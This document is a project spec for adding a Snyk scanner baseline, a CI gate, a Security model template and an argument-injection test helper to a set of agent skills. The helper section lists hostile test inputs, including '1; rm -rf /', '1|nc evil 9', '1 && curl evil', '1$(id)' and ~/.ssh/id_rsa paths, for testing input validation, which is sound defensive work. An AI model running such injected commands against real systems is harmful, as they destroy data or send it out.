# Spec 36: Snyk-scan baseline + Security model template (cross-cutting)

## Problem

Four skills published on `skills.sh` carry security findings that reduce installs:

- **peer-review** v1.10 — Snyk Agent Scan v0.5.1 reports W011 (third-party content exposure, 0.90) and W012 (external URL / vendor endpoint, 0.90). Both are HIGH. Spec 30 + spec 34 already shipped argument validation, boundary markers, secret pre-scan, and stdin transport, yet the scanner still flags the *patterns* (`gh pr view`, `gh pr diff`, external CLI handoff) regardless of mitigation.
- **ship-it** — Snyk W011 (0.80) MEDIUM. No security-hardening spec has ever shipped.
- **pr-comments** v1.40 — Snyk W011 (0.90) MEDIUM. Spec 04 partial.
- **pr-human-guide** v0.8 — Gen Agent Trust Hub (different scanner) flags three HIGH issues: shell injection on `pr_number`, prompt injection via PR title/body/diff and HTML markers, runtime Python script generation in Steps 4–5.

The skills.sh badges will not clear by tightening individual skills alone — W011/W012 fire on the *presence* of `gh pr view` and external CLI calls, which are core features. We need (a) a stable baseline that pins current findings so future regressions are caught, (b) a visible Security model section in each flagged skill so a human reading the skills.sh page sees mitigations next to the finding, and (c) a shared infrastructure that subsequent skill-hardening specs build on.

This spec ships the cross-cutting infrastructure. Specs 37 (pr-human-guide), 38 (ship-it), 39 (pr-comments), and 40 (peer-review) consume it.

## Approach

### Deliverable A — `evals/security/` baseline directory

Create one JSON file per flagged skill capturing the current scanner output:

```json
{
  "scanner": "snyk-agent-scan",
  "scanner_version": "0.5.1",
  "skill": "peer-review",
  "skill_version": "1.10",
  "findings": [
    {"id": "W011", "severity": "high"},
    {"id": "W012", "severity": "high"}
  ],
  "captured_at": "2026-05-09"
}
```

Files: `evals/security/peer-review.baseline.json`, `evals/security/ship-it.baseline.json`, `evals/security/pr-comments.baseline.json`, `evals/security/pr-human-guide.baseline.json`.

Findings are tracked by `id` + `severity` only — we deliberately do not pin the scanner's prose description (which evolves between scanner versions) or risk score (numeric drift across releases is meaningless to the gate).

### Deliverable B — `evals/security/scan.sh`

Bash script that:

1. Iterates the four flagged skills (or `skills/*/SKILL.md` if extended later).
2. Runs `uvx snyk-agent-scan==0.5.1 --skills <path>` per skill (version pinned in `scan.sh` via `SCANNER_PKG`) and parses the output for `[W### severity]:` lines.
3. Compares parsed `(id, severity)` pairs against `evals/security/<skill>.baseline.json`.
4. Exits 0 when the parsed set is a subset of the baseline (no new findings, no severity escalation).
5. Exits 1 with a clear diff when a *new* finding appears OR when an existing finding escalates severity. Pre-existing baseline findings that disappear are reported but do **not** fail (improvements are good).
6. Prints a one-line per-skill summary plus an overall verdict.

The script does not call `uvx` in a way that requires network if the cache is warm. CI caches `~/.cache/uv` between runs.

### Deliverable C — Shared Security model template

`specs/36-snyk-scan-baseline/template.md` — the canonical structure for the `## Security model` section that specs 37/38/39/40 will mirror into their respective SKILL.md files. Sections:

- **Threat model** — what untrusted inputs the skill ingests, where they come from, and what an attacker could try to influence.
- **Mitigations** — concrete steps the skill takes (boundary markers, validation regex, content treatment), each with a phrase anchor pointing at the SKILL.md text that implements it.
- **Residual risks** — what is *not* mitigated, with rationale (e.g., scanner heuristics, third-party model exposure).

Placed immediately above the first untrusted-input ingestion step in each skill.

### Deliverable D — `.github/workflows/security-scan.yml`

CI workflow that runs `evals/security/scan.sh` on PRs that touch `skills/**/SKILL.md` or `evals/security/**`. Caches `~/.cache/uv`. Posts a clear failure annotation if the scan introduces new findings. Job name: `security-scan`. Uses `ubuntu-latest`. Reads `SNYK_TOKEN` from a repository secret of the same name and exposes it to the scan step's environment; when the secret is unset, `scan.sh` prints a notice and exits 0 (the gate is skipped that run rather than failing CI). Local maintainers can require the token by exporting `SECURITY_SCAN_REQUIRE_TOKEN=1`.

### Deliverable E — `tests/_helpers/argument_injection.py`

Pytest fixture exposing a single `ADVERSARIAL_ARGS` constant — a list of strings each pytest argument-injection test imports and parameterizes over. Includes:

- shell metacharacters: `1; rm -rf /`, `1 && curl evil`, `` 1`whoami` ``, `1$(id)`, `1|nc evil 9`
- redirection / globs: `1 > /etc/passwd`, `*`, `~/.ssh/id_rsa`
- whitespace / newlines: `"1\n--malicious"`, `"  "`, `"\t"`
- non-numeric where numeric expected: `abc`, `--malicious`, empty string
- unicode / homoglyphs: `1​`, `１` (fullwidth digit), en-dash `1–2`
- oversized input: `"1" * 10_000`
- path-traversal-flavored values for non-numeric arguments: `../../etc/passwd`, `$HOME`

Also exports `ADVERSARIAL_TEXT_ARGS` for non-numeric argument tests (branch names, focus topics).

### Deliverable F — `evals/security/CLAUDE.md`

Auto-loading rules for the directory:

- When a security-relevant change to any flagged skill lands, refresh that skill's `baseline.json` in the same PR (do not let baselines drift).
- Never delete a finding from a baseline without a PR comment explaining why the underlying mitigation actually closed it (vs. the scanner moved on).
- New skills added to `skills/` that ingest untrusted content should add a baseline file in the same PR.
- Document which scanner versions have been tested (and the date), since scanner heuristics shift between releases.

### Deliverable G — Root `CLAUDE.md` "## Security scanning" section

A short pointer added between the existing "## Spell Checking" and "## Code Review" sections (or wherever fits the topical flow), referencing `evals/security/CLAUDE.md` for details. Mirrored to `.github/copilot-instructions.md` per the existing sync rule.

### Deliverable H — `cspell.config.yaml`

Add `snyk`, plus any new tokens introduced by this PR (e.g., `untrusted_pr_body` if it lands in this spec — though that is more likely to land in spec 38). Letters W011/W012 are uppercase + digits, not flagged by cspell.

## Files to add / modify

| File | Action |
|------|--------|
| `evals/security/scan.sh` | new — scanner runner + diff-against-baseline |
| `evals/security/peer-review.baseline.json` | new |
| `evals/security/ship-it.baseline.json` | new |
| `evals/security/pr-comments.baseline.json` | new |
| `evals/security/pr-human-guide.baseline.json` | new |
| `evals/security/CLAUDE.md` | new — directory rules |
| `.github/workflows/security-scan.yml` | new — CI gate |
| `tests/_helpers/argument_injection.py` | new — `ADVERSARIAL_ARGS` constant (no `__init__.py`; downstream `tests/<skill>/conftest.py` adds `tests/_helpers/` to `sys.path` for `from argument_injection import ...`) |
| `tests/_helpers/test_self.py` | new — sanity coverage for the helper module |
| `specs/36-snyk-scan-baseline/template.md` | new — Security model section template |
| `CLAUDE.md` | update — add `## Security scanning` section |
| `.github/copilot-instructions.md` | update — mirror the new section |
| `cspell.config.yaml` | update — add `snyk` (and any other flagged tokens) |
| `README.md` | update — note `evals/security/` in the repo-structure diagram |

## Out of Scope

- Fixing W011/W012 on peer-review/ship-it/pr-comments. Those are downstream specs (37–40) and they will not eliminate W011/W012 — only document mitigations and add the visible Security model section.
- Concrete fixes to pr-human-guide's three HIGH findings. Spec 37 owns those.
- Prompt-injection eval fixtures under `evals/<skill>/`. Out of scope per the user's selection (only argument-injection unit tests + scan baseline + CI gate).
- Filing scanner upstream issues. Deferred until after skill-hardening specs land and we confirm heuristic behavior persists.

## Branch

`security-baseline`

## Verification

1. `bash evals/security/scan.sh` exits 0 on the spec-36 branch (every parsed finding subsetted by its baseline).
2. Manually edit one baseline file to remove a finding (simulating a "regression" — i.e., scanner flags something the baseline says shouldn't be there); rerun — exits 1 with a clear diff. Revert.
3. `uv run --with pytest pytest tests/_helpers/` imports cleanly (the helper is data-only, but importing must succeed).
4. `npx cspell evals/security/*.md specs/36-snyk-scan-baseline/*.md CLAUDE.md` clean.
5. `python3 -c 'import json; [json.load(open(f"evals/security/{s}.baseline.json")) for s in ["peer-review","ship-it","pr-comments","pr-human-guide"]]'` parses without error.
6. Re-read `CLAUDE.md` and `.github/copilot-instructions.md` end-to-end; confirm both carry the new `## Security scanning` section with equivalent content.
7. Push branch, open PR, run `/pr-comments {pr_number}`, loop until clean. Run `/pr-human-guide` before merge.
8. After merge, run `bash evals/security/scan.sh` from a fresh clone of `main` — exits 0.

## Shipping

1. Commit on branch `security-baseline`: `feat(security): scanner baseline + harness + Security model template (spec 36)`.
2. Push, open PR.
3. `/pr-comments` loop.
4. `/pr-human-guide` annotation.
5. Squash-merge with `gh pr merge --squash --delete-branch`. Sync local main.
6. Notify spec 37/38/39/40 worktrees that the harness is on main; rebase or merge main into each.

## Risks

- The scanner's parser format (`[W### severity]: ...`) may change between versions of `snyk-agent-scan`. The script pins the parse pattern; if a future version emits JSON natively, switch the parser. The baseline file format is forward-compatible.
- `uvx snyk-agent-scan@latest` re-resolves the latest version on every run, which can introduce noise. Mitigation: pin the scanner version inside `scan.sh` (e.g., `snyk-agent-scan==0.5.1`) and bump it deliberately in a PR that also refreshes baselines.
- CI runtime: each `uvx snyk-agent-scan` invocation can take several seconds. Four skills × first-time `uv` resolution can hit 30s+. Cache `~/.cache/uv` to mitigate.
